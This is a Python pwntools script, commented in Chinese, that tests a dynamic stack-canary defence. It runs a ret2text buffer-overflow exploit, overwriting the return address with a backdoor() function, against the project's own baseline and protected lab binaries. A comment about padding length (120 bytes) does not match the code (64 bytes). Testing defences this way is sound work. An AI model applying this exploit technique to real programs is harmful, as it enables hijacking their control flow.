# Copyright 2026 DynamicCanaryProject Authors
#
# 文件名: exp_ret2text.py
# 功能描述: Ret2Text 攻击对比验证脚本（针对 targets 靶场）。
#
#           针对 vuln_standard() 中的栈溢出漏洞，将返回地址覆盖为程序内部
#           已存在的 backdoor() 函数地址，发起最简单的 Ret2Text 攻击。
#           通过 pwntools 的 ELF 模块直接解析 backdoor 的符号地址，无需绕过 ASLR。
#
#           预期结果：
#             - targets_baseline  : backdoor() 被成功执行，控制流劫持成功。
#             - targets_protected : 动态 Canary 拦截溢出，backdoor() 无法执行。
#
# 用法: python3 exp_ret2text.py          # 测试基线版本
#        python3 exp_ret2text.py prot     # 测试动态 Canary 保护版本
#
# 依赖工具: pwntools
# 作者: 陈文嘉
# 创建日期: 2026-04-15

from pwn import *
import sys

is_prot = len(sys.argv) > 1 and sys.argv[1] == 'prot'
target = '../output/targets_protected' if is_prot else '../output/targets_baseline'
print(f"================ 测试目标: {target} ================")

elf = ELF(target)
p = process([target, '1'])

backdoor_addr = elf.symbols['backdoor']

if is_prot:
    # 保护版本的栈帧被 Pass 撑大了，48字节根本摸不到 Canary
    # 我们直接发送 120 字节的超长填充，确保碾压过 Canary 触发拦截！
    payload = b'A' * 64 + p64(backdoor_addr) 
else:
    # 基线版本的栈帧是标准的 32(buf) + 8(rbp) = 40 字节偏移
    payload = b'A' * 40 + p64(backdoor_addr)

p.recvuntil(b": ")
p.send(payload)
print(p.recvall(timeout=1).decode('utf-8', 'ignore'))